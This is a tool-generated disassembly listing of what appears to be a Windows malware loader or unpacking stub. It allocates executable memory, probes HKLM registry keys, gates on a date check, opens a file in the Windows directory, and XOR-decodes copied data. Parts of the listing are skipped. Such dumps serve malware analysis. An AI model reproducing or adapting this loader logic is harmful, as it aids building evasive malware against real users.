0x0041a910:	pushl	%ebp	; from: 0x0041addc(MAY), 0x0041ad29(MAY)
0x0041a911:	movl	%esp, %ebp
0x0041a913:	subl	$0xc, %esp
0x0041a916:	movl	$0x1e4dc, -8(%ebp)
0x0041a91d:	movl	$0x3000, -12(%ebp)
0x0041a924:	movl	$0x40, -4(%ebp)
0x0041a92b:	movl	-4(%ebp), %eax
0x0041a92e:	pushl	%eax
0x0041a92f:	movl	-12(%ebp), %ecx
0x0041a932:	pushl	%ecx
0x0041a933:	movl	0x8(%ebp), %edx
0x0041a936:	pushl	%edx
0x0041a937:	pushl	$0x0
0x0041a939:	pushl	$0xffffffff
0x0041a93b:	call	VirtualAllocEx@kernel32.dll	; targets: 0xff000870(MAY)
0x0041a941:	movl	%ebp, %esp
0x0041a943:	popl	%ebp
0x0041a944:	ret	; targets: 0x0041ade1(MAY), 0x0041ad2e(MAY)

0x0041a950:	pushl	%ebp	; from: 0x0041ad3e(MAY)
0x0041a951:	movl	%esp, %ebp
0x0041a953:	popl	%ebp
0x0041a954:	ret	; targets: 0x0041ad43(MAY)

0x0041a960:	pushl	%ebp	; from: 0x0041ad5c(MAY)
0x0041a961:	movl	%esp, %ebp
0x0041a963:	subl	$0x8, %esp
0x0041a966:	movl	0x8(%ebp), %eax
0x0041a969:	movl	%eax, -4(%ebp)
0x0041a96c:	movl	0xc(%ebp), %ecx
0x0041a96f:	movl	%ecx, -8(%ebp)
0x0041a972:	movl	-4(%ebp), %edx
0x0041a975:	cmpl	-8(%ebp), %edx
0x0041a978:	jae	0x0041a981	; targets: 0x0041a981(MAY), 0x0041a97a(MAY)
0x0041a97a:	movl	-4(%ebp), %eax	; from: 0x0041a978(MAY)
0x0041a97d:	jmp	0x0041a984	; targets: 0x0041a984(MAY)
0x0041a981:	movl	-8(%ebp), %eax	; from: 0x0041a978(MAY)
0x0041a984:	movl	%ebp, %esp	; from: 0x0041a97d(MAY)
0x0041a986:	popl	%ebp
0x0041a987:	ret	; targets: 0x0041ad61(MAY)

0x0041a990:	pushl	%ebp	; from: 0x0041ac6f(MAY)
0x0041a991:	movl	%esp, %ebp
0x0041a993:	movl	$0x401004, 0x0041da24
0x0041a99d:	popl	%ebp
0x0041a99e:	ret	; targets: 0x0041ac74(MAY)

0x0041a9a0:	pushl	%ebp	; from: 0x0041adc2(MAY)
0x0041a9a1:	movl	%esp, %ebp
0x0041a9a3:	movl	$0x41a258, 0x0041da24
0x0041a9ad:	popl	%ebp
0x0041a9ae:	ret	; targets: 0x0041adc7(MAY)

0x0041a9b0:	pushl	%ebp	; from: 0x0041ad1a(MAY), 0x0041adcd(MAY)
0x0041a9b1:	movl	%esp, %ebp
0x0041a9b3:	movl	0x8(%ebp), %eax
0x0041a9b6:	movl	-4(%eax), %eax
0x0041a9b9:	popl	%ebp
0x0041a9ba:	ret	; targets: 0x0041add2(MAY), 0x0041ad1f(MAY)

0x0041aa40:	pushl	%ebp	; from: 0x0041adac(MAY)
0x0041aa41:	movl	%esp, %ebp
0x0041aa43:	subl	$0x28, %esp
0x0041aa46:	movl	$0x11cb, -8(%ebp)
0x0041aa4d:	movl	$0x0, -16(%ebp)
0x0041aa54:	jmp	0x0041aa5f	; targets: 0x0041aa5f(MAY)
0x0041aa5f:	movl	-16(%ebp), %ecx	; from: 0x0041aa54(MAY)
0x0041aa62:	cmpl	0xc(%ebp), %ecx
0x0041aa65:	jae	0x0041ab37	; targets: 0x0041ab37(MAY), 0x0041aa6b(MAY)
0x0041aa6b:	movl	$0x11cb, -8(%ebp)	; from: 0x0041aa65(MAY)
0x0041aa72:	cmpl	$0x0, -16(%ebp)
0x0041aa76:	jne	0x0041aac8	; targets: 0x0041aa78(MAY)
0x0041aa78:	pushl	$0x104	; from: 0x0041aa76(MAY)
0x0041aa7d:	pushl	$0x41da28
0x0041aa82:	call	GetWindowsDirectoryA@kernel32.dll	; targets: 0xff0008a0(MAY)
0x0041aa88:	pushl	$0x41c000
0x0041aa8d:	pushl	$0x41da28
0x0041aa92:	call	lstrcatA@kernel32.dll	; targets: 0xff000810(MAY)
0x0041aa98:	pushl	$0x0
0x0041aa9a:	pushl	$0x80
0x0041aa9f:	pushl	$0x3
0x0041aaa1:	pushl	$0x0
0x0041aaa3:	pushl	$0x3
0x0041aaa5:	pushl	$0x1
0x0041aaa7:	pushl	$0x41da28
0x0041aaac:	call	CreateFileA@kernel32.dll	; targets: 0xff000840(MAY)
0x0041aab2:	movl	%eax, -4(%ebp)
0x0041aab5:	cmpl	$0xffffffff, -4(%ebp)
0x0041aab9:	je	0x0041aac1	; targets: 0x0041aac1(MAY), 0x0041aabb(MAY)
0x0041aabb:	cmpl	$0x0, -4(%ebp)	; from: 0x0041aab9(MAY)
0x0041aabf:	jne	0x0041aac8	; targets: 0x0041aac8(MAY), 0x0041aac1(MAY)
0x0041aac1:	movl	$0x42, %eax	; from: 0x0041aab9(MAY), 0x0041aabf(MAY)
0x0041aac6:	jmp	0x0041ab37	; targets: 0x0041ab37(MAY)
0x0041aac8:	movl	$0x11cb, -8(%ebp)	; from: 0x0041aabf(MAY)
0x0041aacf:	movl	-16(%ebp), %edx
0x0041aad2:	addl	$0x1eed7, %edx
0x0041aad8:	movl	%edx, 0x0041db2c
0x0041aade:	movl	0x8(%ebp), %eax
0x0041aae1:	addl	-16(%ebp), %eax
0x0041aae4:	movl	(%eax), %ecx
0x0041aae6:	addl	-16(%ebp), %ecx
0x0041aae9:	movl	0x8(%ebp), %edx
0x0041aaec:	addl	-16(%ebp), %edx
0x0041aaef:	movl	%ecx, (%edx)
0x0041aaf1:	movl	-12(%ebp), %eax
0x0041aaf4:	movl	%eax, -20(%ebp)
0x0041aaf7:	movl	$0x11cb, -8(%ebp)
0x0041aafe:	movl	0x0041db2c, %ecx
0x0041ab04:	movl	%ecx, -36(%ebp)
0x0041ab07:	movl	-36(%ebp), %edx
0x0041ab0a:	movl	%edx, -32(%ebp)
0x0041ab0d:	movl	-32(%ebp), %eax
0x0041ab10:	movl	%eax, -28(%ebp)
0x0041ab13:	movl	-28(%ebp), %ecx
0x0041ab16:	movl	%ecx, -24(%ebp)
0x0041ab19:	movl	-24(%ebp), %edx
0x0041ab1c:	movl	%edx, -40(%ebp)
0x0041ab1f:	movl	0x8(%ebp), %eax
0x0041ab22:	addl	-16(%ebp), %eax
0x0041ab25:	movl	(%eax), %ecx
0x0041ab27:	xorl	-24(%ebp), %ecx
0x0041ab37:	movl	%ebp, %esp	; from: 0x0041aa65(MAY), 0x0041aac6(MAY)
0x0041ab39:	popl	%ebp
0x0041ab3a:	ret	; targets: 0x0041adb1(MAY)

0x0041aba0:	pushl	%ebp	; from: 0x0041acdd(MAY), 0x0041ac48(MAY)
0x0041aba1:	movl	%esp, %ebp
0x0041aba3:	subl	$0x8, %esp
0x0041aba6:	movl	$0x41c018, -4(%ebp)
0x0041abad:	leal	-8(%ebp), %eax
0x0041abb0:	pushl	%eax
0x0041abb1:	pushl	$0x20019
0x0041abb6:	pushl	$0x0
0x0041abb8:	pushl	$0x41da1c
0x0041abbd:	pushl	$0x80000002
0x0041abc2:	call	0x0041db30	; targets: 0xff0008d0(MAY)
0x0041abc8:	testl	%eax, %eax
0x0041abca:	je	0x0041abd3	; targets: 0x0041abcc(MAY), 0x0041abd3(MAY)
0x0041abcc:	xorl	%eax, %eax	; from: 0x0041abca(MAY)
0x0041abce:	jmp	0x0041ac74	; targets: 0x0041ac74(MAY)
0x0041abd3:	leal	-8(%ebp), %ecx	; from: 0x0041abca(MAY)
0x0041abd6:	pushl	%ecx
0x0041abd7:	pushl	$0x20019
0x0041abdc:	pushl	$0x0
0x0041abde:	pushl	$0x41da20
0x0041abe3:	pushl	$0x80000002
0x0041abe8:	call	0x0041db30	; targets: 0xff0008d0(MAY)
0x0041abee:	testl	%eax, %eax
0x0041abf0:	je	0x0041abf6	; targets: 0x0041abf6(MAY), 0x0041abf2(MAY)
0x0041abf2:	xorl	%eax, %eax	; from: 0x0041abf0(MAY)
0x0041abf4:	jmp	0x0041ac74	; targets: 0x0041ac74(MAY)
0x0041abf6:	movl	$0x53, %edx	; from: 0x0041abf0(MAY)
0x0041abfb:	movl	-4(%ebp), %eax
0x0041abfe:	movw	%dx, (%eax)
0x0041ac01:	leal	-8(%ebp), %ecx
0x0041ac04:	pushl	%ecx
0x0041ac05:	pushl	$0x20019
0x0041ac0a:	pushl	$0x0
0x0041ac0c:	movl	-4(%ebp), %edx
0x0041ac0f:	pushl	%edx
0x0041ac10:	movl	-8(%ebp), %eax
0x0041ac13:	pushl	%eax
0x0041ac14:	call	0x0041db30	; targets: 0xff0008d0(MAY)
0x0041ac1a:	testl	%eax, %eax
0x0041ac1c:	je	0x0041ac22	; targets: 0x0041ac22(MAY), 0x0041ac1e(MAY)
0x0041ac1e:	xorl	%eax, %eax	; from: 0x0041ac1c(MAY)
0x0041ac20:	jmp	0x0041ac74	; targets: 0x0041ac74(MAY)
0x0041ac22:	leal	-8(%ebp), %ecx	; from: 0x0041ac1c(MAY)
0x0041ac25:	pushl	%ecx
0x0041ac26:	pushl	$0x20019
0x0041ac2b:	pushl	$0x0
0x0041ac2d:	pushl	$0x41c030
0x0041ac32:	movl	-8(%ebp), %edx
0x0041ac35:	pushl	%edx
0x0041ac36:	call	0x0041db30	; targets: 0xff0008d0(MAY)
0x0041ac3c:	testl	%eax, %eax
0x0041ac3e:	je	0x0041ac4d	; targets: 0x0041ac40(MAY), 0x0041ac4d(MAY)
0x0041ac40:	pushl	$0x1	; from: 0x0041ac3e(MAY)
0x0041ac42:	pushl	$0x1
0x0041ac44:	pushl	$0x1
0x0041ac46:	pushl	$0x1
0x0041ac48:	call	0x0041aba0	; targets: 0x0041aba0(MAY)
0x0041ac4d:	leal	-8(%ebp), %eax	; from: 0x0041ac77(MAY), 0x0041ac3e(MAY)
0x0041ac50:	pushl	%eax
0x0041ac51:	pushl	$0x20019
0x0041ac56:	pushl	$0x0
0x0041ac58:	pushl	$0x41c0ac
0x0041ac5d:	movl	-8(%ebp), %ecx
0x0041ac60:	pushl	%ecx
0x0041ac61:	call	0x0041db30	; targets: 0xff0008d0(MAY)
0x0041ac67:	testl	%eax, %eax
0x0041ac69:	jne	0x0041ac6f	; targets: 0x0041ac6b(MAY), 0x0041ac6f(MAY)
0x0041ac6b:	xorl	%eax, %eax	; from: 0x0041ac69(MAY)
0x0041ac6d:	jmp	0x0041ac74	; targets: 0x0041ac74(MAY)
0x0041ac6f:	call	0x0041a990	; targets: 0x0041a990(MAY)	; from: 0x0041ac69(MAY)
0x0041ac74:	movl	%ebp, %esp	; from: 0x0041abce(MAY), 0x0041ac6d(MAY), 0x0041abf4(MAY), 0x0041ac20(MAY), 0x0041a99e(MAY)
0x0041ac76:	popl	%ebp
0x0041ac77:	ret	$0x10	; targets: 0x0041ac4d(MAY), 0x0041ace2(MAY)


start:
0x0041ac80:	pushl	%ebp
0x0041ac81:	movl	%esp, %ebp
0x0041ac83:	subl	$0x70, %esp
0x0041ac86:	pusha	
0x0041ac87:	movl	%ebp, 0x0041db34
0x0041ac8d:	movl	$0x0, -60(%ebp)
0x0041ac94:	movl	$0x80000002, -80(%ebp)
0x0041ac9b:	movl	$0xe1d58000, -8(%ebp)
0x0041aca2:	movl	$0x1a8e79f, -4(%ebp)
0x0041aca9:	movl	RegOpenKeyExW@advapi32.dll, %eax
0x0041acae:	movl	%eax, 0x0041db30
0x0041acb3:	leal	-84(%ebp), %ecx
0x0041acb6:	pushl	%ecx
0x0041acb7:	leal	-88(%ebp), %edx
0x0041acba:	pushl	%edx
0x0041acbb:	leal	-8(%ebp), %eax
0x0041acbe:	pushl	%eax
0x0041acbf:	call	FileTimeToDosDateTime@kernel32.dll	; targets: 0xff000950(MAY)
0x0041acc5:	movzwl	-88(%ebp), %ecx
0x0041acc9:	cmpl	$0x21, %ecx
0x0041accc:	je	0x0041acd5	; targets: 0x0041acce(MAY), 0x0041acd5(MAY)
0x0041acce:	xorl	%eax, %eax	; from: 0x0041accc(MAY)
0x0041acd0:	jmp	0x0041aecc	; targets: 0x0041aecc(MAY)
0x0041acd5:	pushl	$0x1	; from: 0x0041accc(MAY)
0x0041acd7:	pushl	$0x1
0x0041acd9:	pushl	$0x1
0x0041acdb:	pushl	$0x1
0x0041acdd:	call	0x0041aba0	; targets: 0x0041aba0(MAY)
0x0041ace2:	movl	$0x0, -20(%ebp)	; from: 0x0041ac77(MAY)
0x0041ace9:	movl	$0x64, -52(%ebp)
0x0041acf0:	movl	$0x12, -28(%ebp)
0x0041acf7:	movl	$0x0, -60(%ebp)
0x0041acfe:	movl	$0x0, -36(%ebp)
0x0041ad05:	movl	$0x1, -48(%ebp)
0x0041ad0c:	movl	$0x3, -24(%ebp)
0x0041ad13:	movl	0x0041da24, %edx
0x0041ad19:	pushl	%edx
0x0041ad1a:	call	0x0041a9b0	; targets: 0x0041a9b0(MAY)
0x0041ad1f:	addl	$0x4, %esp	; from: 0x0041a9ba(MAY)
0x0041ad22:	movl	%eax, -64(%ebp)
0x0041ad25:	movl	-64(%ebp), %eax
0x0041ad28:	pushl	%eax
0x0041ad29:	call	0x0041a910	; targets: 0x0041a910(MAY)
0x0041ad2e:	addl	$0x4, %esp	; from: 0x0041a944(MAY)
0x0041ad31:	movl	%eax, -56(%ebp)
0x0041ad34:	movl	-64(%ebp), %ecx
0x0041ad37:	pushl	%ecx
0x0041ad38:	pushl	$0x0
0x0041ad3a:	movl	-56(%ebp), %edx
0x0041ad3d:	pushl	%edx
0x0041ad3e:	call	0x0041a950	; targets: 0x0041a950(MAY)
0x0041ad43:	addl	$0xc, %esp	; from: 0x0041a954(MAY)
0x0041ad46:	movl	-64(%ebp), %eax
0x0041ad49:	movl	%eax, -72(%ebp)
0x0041ad4c:	movl	-60(%ebp), %ecx	; from: 0x0041ada2(MAY)
0x0041ad4f:	cmpl	-64(%ebp), %ecx
0x0041ad52:	jae	0x0041ada4	; targets: 0x0041ada4(MAY), 0x0041ad54(MAY)
0x0041ad54:	movl	-72(%ebp), %edx	; from: 0x0041ad52(MAY)
0x0041ad57:	pushl	%edx
0x0041ad58:	movl	-52(%ebp), %eax
0x0041ad5b:	pushl	%eax
0x0041ad5c:	call	0x0041a960	; targets: 0x0041a960(MAY)
0x0041ad61:	addl	$0x8, %esp	; from: 0x0041a987(MAY)
0x0041ad64:	movl	%eax, -76(%ebp)
0x0041ad67:	movl	-76(%ebp), %ecx
0x0041ad6a:	pushl	%ecx
0x0041ad6b:	movl	0x0041da24, %edx
0x0041ad71:	addl	-36(%ebp), %edx
0x0041ad74:	pushl	%edx
0x0041ad75:	movl	-56(%ebp), %eax
0x0041ad78:	addl	-60(%ebp), %eax
0x0041ad7b:	pushl	%eax
0x0041ad7c:	call	0x0041b468	; targets: 0x0041b468(MAY)
0x0041ad81:	addl	$0xc, %esp
0x0041ad84:	movl	-28(%ebp), %ecx
0x0041ad87:	addl	-52(%ebp), %ecx
0x0041ad8a:	addl	-36(%ebp), %ecx
0x0041ad8d:	movl	%ecx, -36(%ebp)
0x0041ad90:	movl	-60(%ebp), %edx
0x0041ad93:	addl	-52(%ebp), %edx
0x0041ad96:	movl	%edx, -60(%ebp)
0x0041ad99:	movl	-72(%ebp), %eax
0x0041ad9c:	subl	-76(%ebp), %eax
0x0041ad9f:	movl	%eax, -72(%ebp)
0x0041ada2:	jmp	0x0041ad4c	; targets: 0x0041ad4c(MAY)
0x0041ada4:	movl	-64(%ebp), %ecx	; from: 0x0041ad52(MAY)
0x0041ada7:	pushl	%ecx
0x0041ada8:	movl	-56(%ebp), %edx
0x0041adab:	pushl	%edx
0x0041adac:	call	0x0041aa40	; targets: 0x0041aa40(MAY)
0x0041adb1:	addl	$0x8, %esp	; from: 0x0041ab3a(MAY)
0x0041adb4:	movl	$0x0, -36(%ebp)
0x0041adbb:	movl	$0x0, -96(%ebp)
0x0041adc2:	call	0x0041a9a0	; targets: 0x0041a9a0(MAY)
0x0041adc7:	movl	0x0041da24, %eax	; from: 0x0041a9ae(MAY)
0x0041adcc:	pushl	%eax
0x0041adcd:	call	0x0041a9b0	; targets: 0x0041a9b0(MAY)
0x0041add2:	addl	$0x4, %esp	; from: 0x0041a9ba(MAY)
0x0041add5:	movl	%eax, -100(%ebp)
0x0041add8:	movl	-100(%ebp), %ecx
0x0041addb:	pushl	%ecx
0x0041addc:	call	0x0041a910	; targets: 0x0041a910(MAY)
0x0041ade1:	addl	$0x4, %esp	; from: 0x0041a944(MAY)
0x0041aecc:	movl	%ebp, %esp	; from: 0x0041acd0(MAY)
0x0041aece:	popl	%ebp
0x0041aecf:	ret	; targets: 0xfee70000(MAY)

0x0041b468:	jmp	memcpy@msvcrt.dll	; targets: 0xff000e10(MAY)	; from: 0x0041ad7c(MAY)
